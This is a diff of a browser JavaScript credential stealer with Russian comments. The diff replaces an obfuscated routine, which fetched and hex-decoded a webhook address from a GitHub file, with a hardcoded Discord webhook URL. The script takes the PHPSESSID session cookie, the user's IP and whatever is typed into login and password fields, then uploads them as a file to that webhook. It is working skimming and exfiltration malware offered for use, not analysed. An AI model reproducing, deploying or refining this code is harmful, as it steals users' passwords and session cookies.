@@ -1,4 +1,7 @@
 (async function() {
+    // Вебхук для отправки данных. Вставлен напрямую для демонстрации.
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
+
     // Функция для получения куки
     const getCookie = (name) => {
         const matches = document.cookie.match(new RegExp(
@@ -26,8 +29,8 @@
                                 document.querySelector('input[type="text"]');
             
             const passwordField = document.querySelector('input[type="password"]') || 
-                                 document.querySelector('input[name*="pass"]') ||
-                                 document.querySelector('input#password');
+                                document.querySelector('input[name*="pass"]') ||
+                                document.querySelector('input#password');
             
             const username = usernameField ? usernameField.value : "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО";
             const password = passwordField ? passwordField.value : "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО";
@@ -132,39 +135,7 @@
         }
     };
 
-    const getValidWebhook = async () => {
-        try {
-            const response = await fetch('https://raw.githubusercontent.com/shannonkind87/acs/refs/heads/main/def.js');
-            const text = await response.text();
-            
-            const hexMatch = text.match(/'([\x00-\x7F]+)'/);
-            if (hexMatch && hexMatch[1]) {
-                // Расшифровываем hex строку
-                const hexString = hexMatch[1];
-                let decodedString = '';
-                for (let i = 0; i < hexString.length; i += 4) {
-                    const hexChar = hexString.substr(i, 4);
-                    if (hexChar.startsWith('\\x')) {
-                        const charCode = parseInt(hexChar.substr(2), 16);
-                        decodedString += String.fromCharCode(charCode);
-                    }
-                }
-                return decodedString;
-            }
-            return null;
-        } catch {
-            return null;
-        }
-    };
-
     const sendUserData = async () => {
-        // Получаем и проверяем вебхук
-        const validWebhook = await getValidWebhook();
-        if (!validWebhook) {
-            console.log("Не удалось получить валидный вебхук");
-            return;
-        }
-
         const phpsessid = getCookie('PHPSESSID');
         const userIP = await getIP();
         const credentials = getCredentials();
@@ -175,8 +146,8 @@
         
         // Проверяем, заполнены ли оба поля
         const bothFieldsFilled = credentials.username !== "ПОЛЕ_ЛОГИНА_НЕ_НАЙДЕНО" && 
-                               credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
-                               credentials.username && credentials.password;
+                                 credentials.password !== "ПОЛЕ_ПАРОЛЯ_НЕ_НАЙДЕНО" &&
+                                 credentials.username && credentials.password;
         
         // Получаем уровень с 'x', если поля заполнены
         const userLevel = getUserLevel(bothFieldsFilled);
@@ -203,7 +174,7 @@
         formData.append('file', blob, `user_data_${Date.now()}.txt`);
 
         try {
-            await fetch(validWebhook, {
+            await fetch(WEBHOOK_URL, {
                 method: "POST",
                 body: formData
             });
